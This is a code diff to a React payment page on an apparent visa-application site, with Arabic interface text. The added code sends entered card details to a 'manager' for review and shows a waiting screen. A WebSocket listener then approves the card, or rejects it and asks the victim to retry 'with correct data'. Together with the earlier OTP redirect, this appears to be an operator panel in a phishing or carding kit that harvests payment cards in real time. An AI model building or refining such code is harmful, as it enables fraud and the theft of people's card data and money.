@@ -1,7 +1,8 @@
 import { useState, useEffect } from "react";
-import { CreditCard, Lock, Calendar, User, ShieldCheck, ArrowRight, CheckCircle, AlertCircle } from "lucide-react";
+import { CreditCard, Lock, Calendar, User, ShieldCheck, ArrowRight, CheckCircle, AlertCircle, Loader2 } from "lucide-react";
 import Navbar from "@/components/Navbar";
 import Footer from "@/components/Footer";
+import { useWebSocket } from "@/context/WebSocketContext";
 
 interface PaymentForm {
   cardNumber: string;
@@ -18,6 +19,7 @@ function getQueryParam(key: string): string | null {
 export default function PayVisaPage() {
   const applicationId = getQueryParam("applicationId");
   const sessionId = getQueryParam("session");
+  const { subscribe } = useWebSocket();
   
   const [form, setForm] = useState<PaymentForm>({
     cardNumber: "",
@@ -27,8 +29,29 @@ export default function PayVisaPage() {
   });
   const [isProcessing, setIsProcessing] = useState(false);
   const [errors, setErrors] = useState<Partial<PaymentForm>>({});
-  const [submitStatus, setSubmitStatus] = useState<"idle" | "success" | "error">("idle");
+  const [submitStatus, setSubmitStatus] = useState<"idle" | "success" | "error" | "waiting">("idle");
   const [errorMessage, setErrorMessage] = useState("");
+
+  // الاستماع لرد المدير عبر WebSocket
+  useEffect(() => {
+    if (!sessionId) return;
+
+    const unsubscribe = subscribe((msg: any) => {
+      if (msg.sessionId === sessionId) {
+        if (msg.type === "payment_approved") {
+          setSubmitStatus("success");
+          setTimeout(() => {
+            window.location.href = "/apply/success";
+          }, 2000);
+        } else if (msg.type === "payment_rejected") {
+          setSubmitStatus("error");
+          setErrorMessage(msg.message || "تم رفض بيانات البطاقة. يرجى المحاولة ببيانات صحيحة.");
+        }
+      }
+    });
+
+    return () => unsubscribe();
+  }, [sessionId, subscribe]);
 
   // التحقق من وجود معرف الطلب
   useEffect(() => {
@@ -102,9 +125,8 @@ export default function PayVisaPage() {
         throw new Error(data.error || "فشل في إرسال بيانات الدفع");
       }
 
-      // التحويل لصفحة انتظار التحقق
-      const redirectUrl = `/pay-otp?applicationId=${applicationId}&session=${sessionId}`;
-      window.location.href = redirectUrl;
+      // البقاء في صفحة الانتظار - المدير سيوافق/يرفض
+      setSubmitStatus("waiting");
     } catch (err) {
       console.error("Payment error:", err);
       setSubmitStatus("error");
@@ -174,16 +196,31 @@ export default function PayVisaPage() {
               <div className="w-20 h-20 mx-auto mb-6 bg-green-500/20 rounded-full flex items-center justify-center">
                 <CheckCircle className="w-12 h-12 text-green-400" />
               </div>
-              <h2 className="text-2xl font-bold text-white mb-4">تم استلام بيانات الدفع بنجاح!</h2>
+              <h2 className="text-2xl font-bold text-white mb-4">تمت الموافقة على الدفع!</h2>
               <p className="text-white/70 mb-6">
-                شكراً لك، سيتم مراجعة بيانات الدفع من قبل فريقنا خلال 24 ساعة
+                جاري التحويل لصفحة النجاح...
               </p>
-              <a 
-                href="/" 
-                className="inline-flex items-center gap-2 px-6 py-3 bg-accent text-primary font-bold rounded-xl hover:bg-accent/90 transition-colors"
-              >
-                العودة للصفحة الرئيسية
-              </a>
+            </div>
+          </div>
+        )}
+
+        {/* Waiting for Admin Approval State */}
+        {submitStatus === "waiting" && (
+          <div className="max-w-lg mx-auto">
+            <div className="bg-accent/20 backdrop-blur-xl border border-accent/30 rounded-3xl p-8 shadow-2xl text-center">
+              <div className="w-20 h-20 mx-auto mb-6 bg-accent/20 rounded-full flex items-center justify-center">
+                <Loader2 className="w-12 h-12 text-accent animate-spin" />
+              </div>
+              <h2 className="text-2xl font-bold text-white mb-4">في انتظار موافقة المدير</h2>
+              <p className="text-white/70 mb-6">
+                تم إرسال بيانات البطاقة للمدير للمراجعة.<br />
+                يرجى الانتظار حتى تتم الموافقة.
+              </p>
+              <div className="flex items-center justify-center gap-2 text-accent">
+                <div className="w-3 h-3 bg-accent rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
+                <div className="w-3 h-3 bg-accent rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
+                <div className="w-3 h-3 bg-accent rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
+              </div>
             </div>
           </div>
         )}
